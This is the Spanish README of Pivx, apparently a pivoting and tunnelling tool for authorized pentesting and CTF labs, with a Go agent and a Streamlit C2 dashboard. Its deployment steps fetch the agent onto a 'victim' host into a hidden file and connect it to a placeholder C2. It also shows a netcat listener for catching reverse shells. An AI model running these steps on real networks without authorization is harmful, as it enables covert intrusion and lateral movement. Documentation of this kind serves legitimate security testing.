# Pivx 🕸️

Herramienta de **pivoting y enrutamiento de red** para pentesting autorizado.
Objetivo: mejor usabilidad que Ligolo-ng, con enrutamiento automatizado y una
UI web desde el primer día.

> **Fase 3 (actual):** suite de pivoting para CTF.
> - **L3:** túnel **TUN** `pivx0` + bombeo de paquetes + rutas (netstack gVisor en el agente).
> - **L4:** port forwarding **local (-L)** y **remote (-R)** multiplexado sobre el mismo WS.
> - **L7:** proxy **SOCKS5** dinámico (resolución DNS del lado del agente).
> - Data-plane endurecido (MTU 1350, backpressure) y **Makefile** de cross-build.
> - Framing híbrido: control = frames de texto (JSON); datos = frames binarios,
>   diferenciando **túnel L3** (nibble IP `4`/`6`) de **canal MUX** (`0x01`) por el primer byte.
>
> Ver [`ARCHITECTURE.md`](ARCHITECTURE.md) para el diseño completo.

```
Pivx/
├── Makefile                  # Cross-build del agente (linux/amd64, arm64, win/amd64)
├── agent/                    # Agente en Go
│   ├── go.mod
│   ├── main.go               # Transporte WS + control + descubrimiento (anti-uplink)
│   ├── netstack.go           # Pila gVisor (userland) + forwarders TCP/UDP (túnel L3)
│   └── mux.go                # Multiplexado de streams TCP (L4/L7) sobre el mismo WS
├── server/
│   ├── app.py                # Dashboard Streamlit (túnel + rutas + forwarding + SOCKS)
│   ├── requirements.txt
│   └── pivx_server/
│       ├── db.py             # Persistencia DuckDB (agents, routes, logs)
│       ├── tun.py            # Interfaz TUN de Linux (raw-IP, MTU 1350)
│       ├── runtime.py        # Orquestación TUN <-> WebSocket (plano L3)
│       ├── forward.py        # Capa MUX: port-forwarding L4 + SOCKS5 (plano L4/L7)
│       └── ws_server.py      # Listener WebSocket (control + datos + demux L3/MUX)
├── ARCHITECTURE.md
└── README.md
```

## Requisitos

- **Servidor:** Linux o **WSL2** (la TUN usa `/dev/net/tun`). Se necesita **root**
  (o `CAP_NET_ADMIN`) para crear la interfaz y añadir rutas.
- **Agente:** No necesitas Go instalado si descargas el binario desde
  [Releases](https://github.com/HangLoose84/Pivx/releases). Solo Go 1.22+ si
  quieres compilar desde el código fuente.

## Puesta en marcha

### 1) Servidor (Python, en Linux/WSL2)

> **Nota para Kali Linux y distribuciones modernas:** Python 3.11+ marca los
> paquetes del sistema como `externally-managed-environment` y bloquea `pip
> install` global. Pivx usa un **entorno virtual (`venv`)** para evitar este
> error. El script `install.sh` lo crea automáticamente.

**Instalación rápida (< 2 minutos):**

```bash
git clone https://github.com/HangLoose84/Pivx.git
cd Pivx
chmod +x install.sh
./install.sh
```

**Arrancar el C2:**

```bash
sudo server/venv/bin/streamlit run server/app.py
```

`sudo` es necesario porque el servidor crea la interfaz TUN `/dev/net/tun` y
manipula la tabla de rutas del kernel. Al invocar directamente el `streamlit`
del venv no hace falta `sudo -E` ni activar el entorno manualmente.

El listener WebSocket queda en `ws://0.0.0.0:8765` y la UI en http://localhost:8501.

### 2) Agente

> **No necesitas tener Go instalado ni compilar nada** si solo quieres usar
> Pivx. Descarga el binario precompilado de la pestaña
> [**Releases**](https://github.com/HangLoose84/Pivx/releases) del repositorio
> y súbelo directamente a la máquina víctima:
>
> ```bash
> # Desde la máquina víctima (ejemplo con wget):
> wget https://github.com/HangLoose84/Pivx/releases/latest/download/pivx-agent-linux-amd64 -O /tmp/.p
> chmod +x /tmp/.p
> /tmp/.p --server ws://TU_C2:8765
> ```
>
> Binarios disponibles: `pivx-agent-linux-amd64`, `pivx-agent-linux-arm64`,
> `pivx-agent-windows-amd64.exe`.

#### Compilación desde el código fuente (usuarios avanzados)

Si prefieres compilar el agente tú mismo, necesitas **Go 1.22+**.

Primera vez — obtener gVisor (rama especial `go`) y resolver dependencias:

```bash
cd agent
go get gvisor.dev/gvisor@go
go mod tidy
```

Ejecutar directamente apuntando al servidor:

```bash
go run . --server ws://127.0.0.1:8765
```

#### Compilación con el `Makefile` (recomendado)

Desde la **raíz del proyecto** hay un `Makefile` que cross-compila binarios
estáticos y **despojados** (`-ldflags="-s -w"` + `-trimpath`, sin símbolos ni
DWARF) para reducir al máximo el peso — clave para subir el agente a un target
por una conexión inestable en un CTF.

```bash
make deps          # UNA sola vez: obtiene gVisor (rama `go`) y ordena módulos
make               # compila las 3 plataformas en ./dist
```

Targets individuales:

```bash
make linux-amd64     # -> dist/pivx-agent-linux-amd64
make linux-arm64     # -> dist/pivx-agent-linux-arm64
make windows-amd64   # -> dist/pivx-agent-windows-amd64.exe
make clean           # borra ./dist
```

Los binarios usan `CGO_ENABLED=0` (estáticos, sin dependencia de libc en el
target). Ejemplo de despliegue:

```bash
scp dist/pivx-agent-linux-amd64 target:/tmp/.p
ssh target '/tmp/.p --server ws://TU_C2:8765'
```

### 3) Levantar el túnel y enrutar

1. En el dashboard, sección **Túnel de datos**, elige el agente y pulsa
   **Iniciar túnel** (crea `pivx0`).
2. En **Rutas**, añade la subred interna: con un clic en las **subredes
   descubiertas** por el agente, o a mano (`10.10.20.0/24`).
3. Ahora tus herramientas locales alcanzan la red interna a través del agente:

```bash
nmap -sT -Pn 10.10.20.0/24    # TCP connect + sin ping (ver "Limitaciones" abajo)
curl http://10.10.20.5/
```

> El escaneo debe ser **TCP connect** (`-sT`), no SYN crudo: el proxy opera a
> nivel de socket, no de paquete SYN. Y **siempre `-Pn`**: no hay ICMP a través
> del túnel, así que sin `-Pn` nmap creerá que todo está caído. Ver abajo.

### 4) Verificación

- El agente aparece **online** con su hostname/OS/arch y sus subredes.
- Al iniciar el túnel, `ip addr` en el servidor muestra `pivx0`; `ip route` muestra
  las subredes enrutadas a `pivx0`.
- El tráfico hacia la LAN interna funciona y aparecen líneas `[tcp] proxy
  establecido -> ...` en el log del agente.

### 5) Port forwarding (L4) y SOCKS5 (L7)

Además del túnel L3 (rutas), Pivx multiplexa **streams TCP** sobre el mismo
WebSocket. Estas funciones **no requieren tener el túnel L3 activo**: basta con
un agente conectado. En el dashboard, sección **🔀 Port forwarding (L4)**.

#### Local forward (`-L`) — exponer un servicio interno en tu máquina

Pestaña **Local (-L)**. El servidor abre un puerto en tu máquina y el agente
marca hacia un `IP:puerto` de la red interna.

- **Bind local:** `127.0.0.1` · **Puerto:** `8080` · **Destino (agente):** `10.10.20.5:80`

Ahora `127.0.0.1:8080` en tu equipo == `10.10.20.5:80` en la víctima:

```bash
curl http://127.0.0.1:8080/           # llega al :80 interno vía el agente
```

Útil para abrir en el navegador un panel interno, una BBDD (`...:3306`), RDP, etc.

#### Remote forward (`-R`) — recibir reverse shells desde la víctima

Pestaña **Remote (-R)**. El **agente** abre un puerto en la red víctima y todo lo
que llegue ahí se reenvía a un destino local tuyo (tu handler).

- **Bind víctima:** `0.0.0.0:4444` · **Destino local:** `127.0.0.1:5555`

Prepara tu listener y lanza el payload apuntando al agente:

```bash
# En tu C2:
nc -lvnp 5555
# En la víctima (o el payload), conecta a la IP del agente en el puerto 4444.
# Ese tráfico sale por el túnel y aterriza en tu 127.0.0.1:5555.
```

#### SOCKS5 (L7) — proxy dinámico para herramientas web

Sub-sección **🧦 Proxy SOCKS5**. Pulsa **Iniciar SOCKS5** (por defecto
`127.0.0.1:1080`). La **resolución DNS y la conexión TCP las hace el agente**, así
que los nombres internos se resuelven en la red víctima y tu tráfico sale limpio.

Con `proxychains` (configura `/etc/proxychains4.conf` → `socks5 127.0.0.1 1080`):

```bash
proxychains -q curl http://intranet.victima.local/
proxychains -q smbclient -L //10.10.20.5/
```

Directo en las herramientas que soportan SOCKS:

```bash
# ffuf / dirsearch / feroxbuster
ffuf -x socks5://127.0.0.1:1080 -u http://10.10.20.5/FUZZ -w wordlist.txt
dirsearch -x 500 --proxy socks5://127.0.0.1:1080 -u http://10.10.20.5/
curl --socks5-hostname 127.0.0.1:1080 http://10.10.20.5/   # --socks5-hostname = DNS remoto
```

**Burp Suite:** *Settings → Network → Connections → SOCKS proxy* →
host `127.0.0.1`, puerto `1080`, marca *"Do DNS lookups over SOCKS proxy"*. A
partir de ahí, todo el tráfico de Burp hacia la red interna va por el agente.

> SOCKS5 solo hace **CONNECT** sobre **TCP**. Para el descubrimiento con nmap a
> través de proxychains sigue aplicando `-sT` (y añade `-Pn`): `proxychains -q
> nmap -sT -Pn -p 80,443,445 10.10.20.5`.

---

## Limitaciones conocidas / Tips de uso

Léelo antes de escanear: evita perder tiempo persiguiendo "hosts caídos" que en
realidad sí están vivos.

### ⚠️ No hay ICMP a través del túnel — usa `nmap -sT -Pn`

El plano de datos solo reconstruye **TCP y UDP** en *userland* (el netstack del
agente tiene forwarders TCP/UDP, pero **no** un proxy ICMP). Consecuencias:

- **`ping 10.10.20.5` no funciona** a través de `pivx0`, aunque el host exista.
- El **descubrimiento de hosts por defecto de nmap usa ICMP/ARP**, que no cruzan
  el túnel. Sin desactivarlo, nmap marcará los equipos como *down* y no los
  escaneará.

**Regla práctica — usa siempre estas dos flags:**

```bash
nmap -sT -Pn 10.10.20.0/24
```

- `-sT` → **TCP connect scan**. El proxy trabaja a nivel de socket, no reenvía
  paquetes SYN crudos; un SYN-scan (`-sS`) no funcionará.
- `-Pn` → **omite el descubrimiento de host** (asume que todos están vivos y va
  directo al escaneo de puertos). Sin esto, los equipos internos "parecerán
  caídos" y nmap los saltará. **Es obligatorio con Pivx.**

> Para acotar el escaneo (dado que se prueban todos los hosts), limita puertos:
> `nmap -sT -Pn -p 22,80,139,443,445,3389 10.10.20.0/24`.

### Otras limitaciones actuales

- **Un solo túnel / un solo agente activo** a la vez (enfoque CTF). El
  multi-agente simultáneo queda **aplazado** (fuera del alcance de la Fase 3).
- **Sin TLS/wss ni autenticación** del agente todavía (Fase 4). No lo uses fuera
  de un laboratorio o red controlada.
- El **SOCKS5** solo implementa el comando **CONNECT** sobre TCP (sin BIND ni
  UDP ASSOCIATE), suficiente para escaneo/fuzzing/proxy web.
- Un agente que pierde la conexión sin cierre limpio pasa a **`offline`
  automáticamente** tras ~45 s sin pings (barrido de keep-alive del servidor).

## Notas y limitaciones (gVisor / entorno)

- **gVisor** tiene una API sensible a la versión; este código sigue la rama `go`.
  Si `go mod tidy` deja algún símbolo desalineado, ajusta los nombres en
  `netstack.go` a la versión resuelta.
- Aún **sin TLS/wss ni autenticación** del agente (Fase 4).
- No probado en Windows como servidor (se eligió Linux/WSL2 para la TUN).

⚠️ Úsese únicamente en sistemas propios o con **autorización explícita**.
